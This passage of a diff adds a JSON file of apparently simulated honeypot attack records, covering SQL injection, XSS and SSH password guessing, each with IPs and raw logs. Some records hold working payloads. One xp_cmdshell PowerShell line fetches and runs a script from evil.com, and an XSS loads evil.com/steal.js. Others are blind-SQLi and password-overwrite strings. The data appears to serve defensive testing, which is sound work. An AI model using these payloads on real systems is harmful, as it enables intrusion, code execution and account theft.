+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "199.247.242.2"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "a91213d435109b93cc022b182bbe76c3"
+  },
+  "6373c7d1-fb9c-4fad-a4e8-999af455ba4b": {
+    "id": "6373c7d1-fb9c-4fad-a4e8-999af455ba4b",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:16.397827",
+    "source_ip": "185.213.20.120",
+    "attack_type": "login_attempt",
+    "username": "jenkins",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:27:16.397827 [HoneyPotSSHTransport,0,185.213.20.120] login attempt [b'jenkins'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "7c38876c3c7dee0238680590cf7eda95"
+  },
+  "63354a6f-d638-4eba-aca1-092e9178953a": {
+    "id": "63354a6f-d638-4eba-aca1-092e9178953a",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:19.397941",
+    "source_ip": "62.22.70.93",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "target_field": "search",
+      "raw_log": "2025-04-14T15:27:19.397941 [HoneyPotWeb,0,62.22.70.93] XSS attempt: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "insertion_point": "cookie",
+      "context": "html",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "reflected",
+      "target_browsers": [
+        "Chrome",
+        "Firefox"
+      ]
+    },
+    "attack_hash": "1f24a0a37aae47382c8faf368c57699f"
+  },
+  "b268ec54-4cb9-40c8-b900-013d3b4ba674": {
+    "id": "b268ec54-4cb9-40c8-b900-013d3b4ba674",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:22.386687",
+    "source_ip": "217.253.226.8",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "' UNION ALL SELECT CONCAT(table_name,'.',column_name) FROM information_schema.columns --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:27:22.386687 [HoneyPotWeb,0,217.253.226.8] SQL injection attempt: ' UNION ALL SELECT CONCAT(table_name,'.',column_name) FROM information_schema.columns --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "62.78.25.70"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "16f6ee10261f2062def35dd363caab8c"
+  },
+  "c916118e-e272-4831-abaf-feb8b1e4f4ef": {
+    "id": "c916118e-e272-4831-abaf-feb8b1e4f4ef",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:25.405129",
+    "source_ip": "62.231.205.86",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:27:25.405129 [HoneyPotWeb,0,62.231.205.86] SQL injection attempt: '; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "173.26.6.237"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "bf6f120ea64cffbcee6b6f968cb66b90"
+  },
+  "ff173679-5f9c-4844-87e6-2e409bff97eb": {
+    "id": "ff173679-5f9c-4844-87e6-2e409bff97eb",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:28.397956",
+    "source_ip": "194.105.131.253",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "' UNION ALL SELECT CONCAT(table_name,'.',column_name) FROM information_schema.columns --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:27:28.397956 [HoneyPotWeb,0,194.105.131.253] SQL injection attempt: ' UNION ALL SELECT CONCAT(table_name,'.',column_name) FROM information_schema.columns --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "241.100.200.33"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "fa8463b82c43c375a04b1e79eb3b2023"
+  },
+  "4d3a2a07-5b9d-4eb3-9229-3a24148fea3c": {
+    "id": "4d3a2a07-5b9d-4eb3-9229-3a24148fea3c",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:31.394472",
+    "source_ip": "45.176.34.204",
+    "attack_type": "login_attempt",
+    "username": "postgres",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:27:31.394472 [HoneyPotSSHTransport,0,45.176.34.204] login attempt [b'postgres'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "b7cb8cebbff16ba1f8ecbb8584c4f06d"
+  },
+  "0b51bb1e-7069-454c-b1e6-cda30b132938": {
+    "id": "0b51bb1e-7069-454c-b1e6-cda30b132938",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:34.395069",
+    "source_ip": "95.224.161.90",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "<img src=x onerror=\"(()=>{var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();\">",
+      "target_field": "email",
+      "raw_log": "2025-04-14T15:27:34.395069 [HoneyPotWeb,0,95.224.161.90] XSS attempt: <img src=x onerror=\"(()=>{var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();\">",
+      "insertion_point": "form",
+      "context": "javascript",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "DOM-based",
+      "target_browsers": [
+        "Firefox",
+        "Safari"
+      ]
+    },
+    "attack_hash": "9343e71336ce3e4e758a7832d41b9bcb"
+  },
+  "a1a70ed3-126a-4e55-bef4-60c612dcf273": {
+    "id": "a1a70ed3-126a-4e55-bef4-60c612dcf273",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:37.407850",
+    "source_ip": "217.94.118.179",
+    "attack_type": "login_attempt",
+    "username": "tomcat",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:27:37.407850 [HoneyPotSSHTransport,0,217.94.118.179] login attempt [b'tomcat'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "c1974a28b367f176721b3c5704f29c25"
+  },
+  "7b88e9cc-aba8-4b01-9e5d-7840bdf7842f": {
+    "id": "7b88e9cc-aba8-4b01-9e5d-7840bdf7842f",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:40.393941",
+    "source_ip": "45.179.223.96",
+    "attack_type": "login_attempt",
+    "username": "udit",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:27:40.393941 [HoneyPotSSHTransport,0,45.179.223.96] login attempt [b'udit'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "652ad9fb41c8173cb385fc543a636f35"
+  },
+  "c77c262b-ac80-4e9d-b8c1-326b16dc7730": {
+    "id": "c77c262b-ac80-4e9d-b8c1-326b16dc7730",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:43.398997",
+    "source_ip": "62.224.90.232",
+    "attack_type": "login_attempt",
+    "username": "udit",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:27:43.398997 [HoneyPotSSHTransport,0,62.224.90.232] login attempt [b'udit'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "d4d3bc3c825d238bdcfbb7eaf2139811"
+  },
+  "b0f0728e-a195-4a54-b116-b5f69ac66c14": {
+    "id": "b0f0728e-a195-4a54-b116-b5f69ac66c14",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:46.404582",
+    "source_ip": "62.143.118.244",
+    "attack_type": "login_attempt",
+    "username": "ec2-user",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:27:46.404582 [HoneyPotSSHTransport,0,62.143.118.244] login attempt [b'ec2-user'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "ef51345f107b8436e7b8db70942c6b20"
+  },
+  "90184a8a-8baf-4609-9b4c-43985d3275a8": {
+    "id": "90184a8a-8baf-4609-9b4c-43985d3275a8",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:49.393181",
+    "source_ip": "185.52.241.253",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:27:49.393181 [HoneyPotWeb,0,185.52.241.253] SQL injection attempt: '; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "29.216.189.206"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "5ba96072ce1d7e1ed5b2952367920349"
+  },
+  "22876068-b4ec-45a3-9c13-8940165acee1": {
+    "id": "22876068-b4ec-45a3-9c13-8940165acee1",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:52.384635",
+    "source_ip": "8.104.155.117",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "target_field": "comment",
+      "raw_log": "2025-04-14T15:27:52.384635 [HoneyPotWeb,0,8.104.155.117] XSS attempt: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "insertion_point": "form",
+      "context": "javascript",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "reflected",
+      "target_browsers": [
+        "Safari",
+        "Chrome"
+      ]
+    },
+    "attack_hash": "91b92f78e0547c32b604cb9a53c24c81"
+  },
+  "c271a117-bcb8-4892-96d6-ca68c36828fd": {
+    "id": "c271a117-bcb8-4892-96d6-ca68c36828fd",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:55.385899",
+    "source_ip": "58.109.64.254",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "target_field": "email",
+      "raw_log": "2025-04-14T15:27:55.385899 [HoneyPotWeb,0,58.109.64.254] XSS attempt: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "insertion_point": "body",
+      "context": "html",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "DOM-based",
+      "target_browsers": [
+        "Chrome",
+        "Firefox"
+      ]
+    },
+    "attack_hash": "fa937c8260437e67657bdd0845c5383d"
+  },
+  "cf82ef67-d721-4faa-b7ba-2619fd9c727b": {
+    "id": "cf82ef67-d721-4faa-b7ba-2619fd9c727b",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:58.386431",
+    "source_ip": "185.113.146.243",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "<img src=x onerror=\"(()=>{var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();\">",
+      "target_field": "email",
+      "raw_log": "2025-04-14T15:27:58.386431 [HoneyPotWeb,0,185.113.146.243] XSS attempt: <img src=x onerror=\"(()=>{var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();\">",
+      "insertion_point": "cookie",
+      "context": "attribute",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "reflected",
+      "target_browsers": [
+        "Chrome",
+        "Firefox"
+      ]
+    },
+    "attack_hash": "32b071080c65e4b6869a58660052c523"
+  },
+  "78b166ac-e8a9-4d94-a57e-e8cd17dc7817": {
+    "id": "78b166ac-e8a9-4d94-a57e-e8cd17dc7817",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:01.396446",
+    "source_ip": "172.53.7.220",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "' UNION ALL SELECT CONCAT(table_name,'.',column_name) FROM information_schema.columns --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:28:01.396446 [HoneyPotWeb,0,172.53.7.220] SQL injection attempt: ' UNION ALL SELECT CONCAT(table_name,'.',column_name) FROM information_schema.columns --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "206.186.128.82"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "eaffbaceea127bb61614036fea3a0e09"
+  },
+  "96983d17-ff51-4fee-b0b2-197fe0f83502": {
+    "id": "96983d17-ff51-4fee-b0b2-197fe0f83502",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:04.706030",
+    "source_ip": "104.254.61.134",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:28:04.706030 [HoneyPotSSHTransport,0,104.254.61.134] login attempt [b'azureuser'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "98f32821e8d6e4a49bd61c056018ae9f"
+  },
+  "b9f6a001-4dd3-4f8a-bd92-cecde1f21236": {
+    "id": "b9f6a001-4dd3-4f8a-bd92-cecde1f21236",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:07.398941",
+    "source_ip": "58.88.167.191",
+    "attack_type": "login_attempt",
+    "username": "tomcat",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:28:07.398941 [HoneyPotSSHTransport,0,58.88.167.191] login attempt [b'tomcat'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "87945e2ea20cb2c01feab27bfbb9969b"
+  },
+  "fafceff4-ac49-453b-97d7-d41ca8dc253d": {
+    "id": "fafceff4-ac49-453b-97d7-d41ca8dc253d",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:10.390457",
+    "source_ip": "194.109.229.34",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "target_field": "email",
+      "raw_log": "2025-04-14T15:28:10.390457 [HoneyPotWeb,0,194.109.229.34] XSS attempt: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "insertion_point": "form",
+      "context": "javascript",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "reflected",
+      "target_browsers": [
+        "Chrome",
+        "Edge"
+      ]
+    },
+    "attack_hash": "385615973bc08fc04e653b084c58457a"
+  },
+  "6f127da3-7c7a-4566-8ee3-d29028fcc330": {
+    "id": "6f127da3-7c7a-4566-8ee3-d29028fcc330",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:13.398499",
+    "source_ip": "185.221.78.168",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:28:13.398499 [HoneyPotWeb,0,185.221.78.168] SQL injection attempt: ' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "57.76.67.55"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "c67a3d97f27fd54d0b538b278580da3b"
+  },
+  "9c3c4a43-7959-4829-b405-36cecb12c9cc": {
+    "id": "9c3c4a43-7959-4829-b405-36cecb12c9cc",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:16.396605",
+    "source_ip": "34.196.9.199",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:28:16.396605 [HoneyPotWeb,0,34.196.9.199] SQL injection attempt: '; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "61.23.221.254"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "e8c53b4169c0a3483e7ab69f11cab7c9"
+  },
+  "f5b687aa-31b7-4f95-93be-63ca05e3e51a": {
+    "id": "f5b687aa-31b7-4f95-93be-63ca05e3e51a",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:19.585073",
+    "source_ip": "13.66.171.155",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:28:19.585073 [HoneyPotWeb,0,13.66.171.155] SQL injection attempt: '; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "174.25.254.143"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "6382ea12e609540aa39ac410dc3d0277"
+  },
+  "21fa52c0-5716-4818-a498-b6db7a4b0b9c": {
+    "id": "21fa52c0-5716-4818-a498-b6db7a4b0b9c",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:22.393749",
+    "source_ip": "45.176.62.66",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:28:22.393749 [HoneyPotSSHTransport,0,45.176.62.66] login attempt [b'admin'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "256c0816f193c6fca2190591573b66f4"
+  },
+  "9912dc61-8976-4a82-8852-dcb3211843e8": {
+    "id": "9912dc61-8976-4a82-8852-dcb3211843e8",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:25.384798",
+    "source_ip": "62.231.254.229",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:28:25.384798 [HoneyPotWeb,0,62.231.254.229] SQL injection attempt: ' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "96.34.25.104"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "496e784b29b41ec902d4557f20c8ad5f"
+  },
+  "c88d4ad4-ca30-4253-8a5d-3327b2b2d71d": {
+    "id": "c88d4ad4-ca30-4253-8a5d-3327b2b2d71d",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:28.394678",
+    "source_ip": "58.60.125.64",
+    "attack_type": "login_attempt",
+    "username": "udit",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:28:28.394678 [HoneyPotSSHTransport,0,58.60.125.64] login attempt [b'udit'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "ad94f1b1ebf7b5d193464760a770c9bb"
+  },
+  "8629cbdb-e142-4836-9058-cce3d2c4ef7c": {
+    "id": "8629cbdb-e142-4836-9058-cce3d2c4ef7c",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:31.394076",
+    "source_ip": "194.136.250.226",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:28:31.394076 [HoneyPotWeb,0,194.136.250.226] SQL injection attempt: '; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "172.36.108.141"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "cc1bccf78aa5b1f4179dbad5a00a5e90"
+  },
+  "c3f3b1ea-cad6-41ca-978e-d3e679d58505": {
+    "id": "c3f3b1ea-cad6-41ca-978e-d3e679d58505",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:34.394703",
+    "source_ip": "176.94.172.159",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:28:34.394703 [HoneyPotWeb,0,176.94.172.159] SQL injection attempt: '; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "50.15.190.45"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "e2ad5dcb72d9a21f2b9f0c49f7e30158"
+  },
+  "26ee57a7-2989-4ee0-a5c2-99ce149471bf": {
+    "id": "26ee57a7-2989-4ee0-a5c2-99ce149471bf",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:28:37.395272",
+    "source_ip": "176.144.180.71",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "target_url": "http://192.168.1.100:22/login",
